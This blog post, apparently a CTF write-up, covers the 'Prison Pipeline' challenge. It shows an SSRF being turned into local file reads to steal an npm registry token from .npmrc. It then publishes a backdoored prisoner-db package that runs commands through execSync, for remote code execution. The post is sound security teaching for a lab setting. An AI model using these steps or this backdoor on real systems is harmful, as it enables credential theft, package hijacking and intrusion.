---
layout: post
title:  "Performing Supply-Chain Attack in the NodeJS Ecosystem [hands-on exercise]"
date: 2024-09-14
categories: CTF
thumbnail: /img/supply-chain-attack/supply-chain-thumbnail.png
tags: supply-chain-attack npm npm-registry nodejs verdaccio ssrf lfr remote-code-execution rce express ctf web write-up HTB business-ctf
---

Have you ever wondered what a supply-chain attack in the NodeJS ecosystem could look like? In this blog post, we'll explore a CTF challenge I created to demonstrate a supply-chain attack in the NodeJS ecosystem. The challenge was originally released as "Prison Pipeline" at the Business CTF 2024, hosted by Hack The Box.

## Methodology

A supply-chain attack is a cyberattack that seeks to damage an organization by targeting less secure elements in the supply chain. In software development, a supply-chain attack involves inserting malicious code into a software package used by the target organization. The malicious code is then executed when the software package is installed or updated.

![Supply Chain Attack](/img/supply-chain-attack/supply-chain-steps.png)

I have broken down the supply-chain attack into the above three steps. The hands-on exercise will require you to perform the first two steps of the supply-chain attack. The third step is automated in the challenge.

In the next section, we'll analyze the challenge files and go through the solution process.

Download the challenge files from the following GitHub folder - <a href="https://github.com/hackthebox/business-ctf-2024/tree/main/misc/%5BMedium%5D%20Prison%20Pipeline" target="_blank">[hackthebox/business-ctf-2024]</a> to follow along.

You can launch the challenge instance locally by running the `build-docker.sh` script.

## Application Stack Review

The challenge provides the entire application source code. Let's start with the Docker entrypoint script which provisions everything for the challenge. From the [config/supervisord.conf](#) file, the challenge host is running 4 separate programs:

```ini
[program:nginx]
user=root
command=nginx
autostart=true
logfile=/dev/null
logfile_maxbytes=0

[program:registry]
directory=/home/node
user=node
command=verdaccio --config /home/node/.config/verdaccio/config.yaml
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:pm2-node]
directory=/app
user=node
environment=HOME=/home/node,PM2_HOME=/home/node/.pm2,PATH=%(ENV_PATH)s
command=pm2-runtime start /app/prod.config.js
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:cronjob]
directory=/app
user=node
environment=HOME=/home/node,PM2_HOME=/home/node/.pm2,PATH=%(ENV_PATH)s
command=/home/node/cronjob.sh
autostart=true
logfile=/dev/null
logfile_maxbytes=0
```


If we take a look at the config files for each of these services, we can get a basic idea of their purpose. From the [config/nginx.conf](config/nginx.conf) file, we can see that the Nginx service is configured to reverse proxy traffic to two different services:
```nginx
server {
    listen 1337;
    server_name registry.prison-pipeline.htb;

    location / {
        proxy_pass http://localhost:4873/;
        proxy_set_header Host $host:$server_port;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-NginX-Proxy true;
    }
}

server {
    listen 1337 default_server;
    server_name _;

    location / {
        proxy_pass http://localhost:5000/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Port $server_port;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

Here's a basic diagram showcasing the relation of each of these services:

![Application Stack Diagram](/img/supply-chain-attack/stack-diagram.png)


The cronjob script seems to check and update only one private package and restart the main application if updated:

```sh
#!/bin/bash

# Secure entrypoint
chmod 600 /home/node/.config/cronjob.sh

# Set up variables
REGISTRY_URL="http://localhost:4873"
APP_DIR="/app"
PACKAGE_NAME="prisoner-db"

cd $APP_DIR;

while true; do
    # Check for outdated package
    OUTDATED=$(npm --registry $REGISTRY_URL outdated $PACKAGE_NAME)

    if [[ -n "$OUTDATED" ]]; then
        # Update package and restart app
        npm --registry $REGISTRY_URL update $PACKAGE_NAME
        pm2 restart prison-pipeline
    fi

    sleep 30
done
```



This `prisoner-db` NodeJS package is published to a local private registry during the `docker build` stage via the [config/setup-registry.sh](#) file. The package exports a database class interface which is used by the main application:

```js
/**
 * Database interface for prisoners of Prison-Pipeline.
 * @class Database
 * @param {string} repository - Path to existing database repository.
 * @example
 * const db = new Database('/path/to/repository');
**/
```

In the main application source, we can see this package being used in the [application/routes/index.js](challenge/application/routes/index.js) file:

```js
const prisonerDB = require('prisoner-db');

const db = new prisonerDB('/app/prisoner-repository');
```

The private proxy registry software in-use is [Verdaccio](https://verdaccio.org/). What is Verdaccio?
![verdaccio](/img/supply-chain-attack/verdaccio.png)
Verdaccio is a lightweight private npm proxy registry. It allows you to have a local npm registry with zero configuration. Organizations with large codebases often need to manage dependencies across multiple projects. Verdaccio allows you to have a local npm registry to store your private packages without the need to publish them to the public NPM registry.


From it's configuration file in [config/verdaccio.yaml](#), we can see the access control defined for different packages:

```yaml
packages:
  'prisoner-*':
    # scoped packages
    access: $all
    publish: $authenticated
    # don't query external registry
    # proxy: npmjs

  '@*/*':
    access: $all
    publish: $authenticated
    proxy: npmjs

  '**':
    access: $all
    publish: $authenticated
    proxy: npmjs
```

This essentially means that all packages starting with `prisoner-` prefix will not be collected from external registry like NPM. To publish a package, the user has to be authenticated to the registry.

We can now imagine a scenario in which, if we publish a newer version of the prisoner-db package to the private registry, we can trigger code execution on the main application. The next step is figuring out how to get authenticated to the registry.



## Local File Read via SSRF

Visiting the application homepage displays the following interface:

![Application Homepage](/img/supply-chain-attack/image-20240523033419118.png)



We can load different records by selecting a card from the right. We can't update the records but the "Import Prisoner Record" option seems to be functional. If we submit "http://www.google.com" and import, a new card is added to the right. If we load the card, we can see the response of the submitted URL as a record:

![SSRF Read](/img/supply-chain-attack/image-20240523034010662.png)

This is a full-read SSRF vulnerability in the application. We can trace this vulnerable code to the private package's [prisoner-db/index.js](challenge/prisoner-db/index.js) file:

```js
async importPrisoner(url) {
    try {
        const getResponse = await curl.get(url);
        const xmlData = getResponse.body;

        const id = `PIP-${Math.floor(100000 + Math.random() * 900000)}`;

        const prisoner = {
            id: id,
            data: xmlData
        };

        this.addPrisoner(prisoner);
        return id;
    }
    catch (error) {
        console.error('Error importing prisoner:', error);
        return false;
    }
}
```

The `curl` object here is an instance of a custom class which is just a wrapper for the [node-libcurl](https://www.npmjs.com/package/node-libcurl) library. It is well-established at this point that if you have SSRF via `libcurl` you can utilize the `file://` protocol to read local files:

![SSRF to LFR with File protocol](/img/supply-chain-attack/image-20240523100138295.png)

With the newly discovered exploit to read local files, the next logical step is identifying any secrets on the filesystem that we can exfiltrate to exploit further.

## Hijacking Registry Access with Stolen Auth Token

If we want to hijack the `prisoner-db` library, we need access to the user account that published the package. Reviewing the [config/setup-registry.sh](#) file, we can see a user `registry` is created with the `npm` cli to publish the package to the private registry:

```sh
NPM_USERNAME="registry"
NPM_EMAIL="registry@prison-pipeline.htb"
NPM_PASSWORD=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)

...snip...

# Add registry user
/usr/bin/expect <<EOD
spawn npm adduser --registry $REGISTRY_URL
expect {
  "Username:" {send "$NPM_USERNAME\r"; exp_continue}
  "Password:" {send "$NPM_PASSWORD\r"; exp_continue}
  "Email: (this IS public)" {send "$NPM_EMAIL\r"; exp_continue}
}
EOD

# Publish private package
cd $PRISONER_DB_PKG_DIR
npm publish --registry $REGISTRY_URL

```

The `npm` cli was run under the linux `node` username . We can read the auth token stored by the `npm` cli from  the `/home/node/.npmrc` file:

![Reading .npmrc with LFR](/img/supply-chain-attack/image-20240523132446435.png)



From the [config/nginx.conf](#) file, the `registry.prison-pipeline.htb` hostname is defined to reverse proxy traffic to the registry service:

```nginx
server {
    listen 1337;
    server_name registry.prison-pipeline.htb;

    location / {
        proxy_pass http://localhost:4873/;
        proxy_set_header Host $host:$server_port;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-NginX-Proxy true;
    }
}
```

We can edit the exfiltrated `.npmrc` content to reflect the host and port of the challenge and save it in our own `~/.npmrc` file:

```
//registry.prison-pipeline.htb:1337/:_authToken="ODk3ODFjODRiYWY3M2Y0M2I3N2JkYTNlZmJlZmQ4ZTA6MDcyNDBiNGM2MmI5OThhYjNjN2U2OGZkMzcxYmRmNjhkNGVlZWM3YjdlOGNiMjFiODljNzAwZGMyNzA0NmFkNDE5OTM4YTdkNDc2ZDlkYzE3Yg=="
```

We also have to add an entry to the `/etc/hosts` file to resolve the hostname to the challenge Instance IP address:

```init
127.0.0.1	localhost registry.prison-pipeline.htb
```

We can verify that the auth token is working properly by running the `npm whoami` command:

```sh
$ npm --registry=http://registry.prison-pipeline.htb:1337 whoami

# registry
```

We now have access to the private registry account on the challenge registry.



## Publishing Malicious Package Version for RCE

With access to the publishing account of the `prisoner-db` package, we can now craft a malicious version of the package and release it as a newer version to trigger updates. We will implement a backdoor in the  `importPrisoner` function defined in the  [prisoner-db/index.js](challenge/prisoner-db/index.js) file:

```js
async importPrisoner(url) {
    // implement backdoor
    const child_process = require('child_process');
    if (url.includes('CREW_BACKDOOR:')) {
        try {
            let cmd = url.replace('CREW_BACKDOOR:', '');
            let output = child_process.execSync(cmd).toString();
            return output;
        }
        catch (error) {
            return 'CREW_BACKDOOR: Error executing command.';
        }
    }

    // rest of the function code
```

We are modifying the function responsible for importing prisoner records by URL to execute system commands if the URL starts with `CREW_BACKDOOR:` prefix. We'll update the package version in the [prisoner-db/package.json](challenge/prisoner-db/package.json) file to `1.0.1`:

```json
  "version": "1.0.1",
```

We can now publish the new version of the package to the private registry by running the following command:

```sh
$ npm --registry=http://registry.prison-pipeline.htb:1337 publish

npm notice 
npm notice 📦  prisoner-db@1.0.1
npm notice === Tarball Contents === 
npm notice 68B   README.md   
npm notice 1.7kB curl.js     
npm notice 3.7kB index.js    
npm notice 375B  package.json
npm notice === Tarball Details === 
npm notice name:          prisoner-db                             
npm notice version:       1.0.1                                   
npm notice filename:      prisoner-db-1.0.1.tgz                   
npm notice package size:  1.9 kB                                  
npm notice unpacked size: 5.9 kB                                  
npm notice shasum:        45089115a6c28a60be40eec5dd3439e196aa13e0
npm notice integrity:     sha512-c+2a/AXllhuvh[...]ytI6OM7GiwI2Q==
npm notice total files:   4                                       
npm notice 
+ prisoner-db@1.0.1
```

The cronjob on the system will update the package and have the backdoor in place to trigger the RCE. We can now utilize the backdoor by requesting the `/api/prisoners/import` endpoint:

![Burp HTTP Request triggering RCE](/img/supply-chain-attack/image-20240524125214708.png)

You can read the flag by executing the `/readflag` binary. This brings us to the end of this challenge exercise.

To summarize, we have successfully performed a supply-chain attack in the NodeJS realm. We exploited an SSRF vulnerability to read local files and hijacked the private registry access. We then published a malicious version of a private package to trigger auto-update on the node application. Finally, we utilized the backdoor in the package to gain remote code execution on the system.

I hope this hands-on exercise has provided you with a better understanding of supply-chain attacks in the NodeJS ecosystem. If you have any questions or feedback, feel free to reach out on Twitter - [@rayhan0x01](https://twitter.com/rayhan0x01).

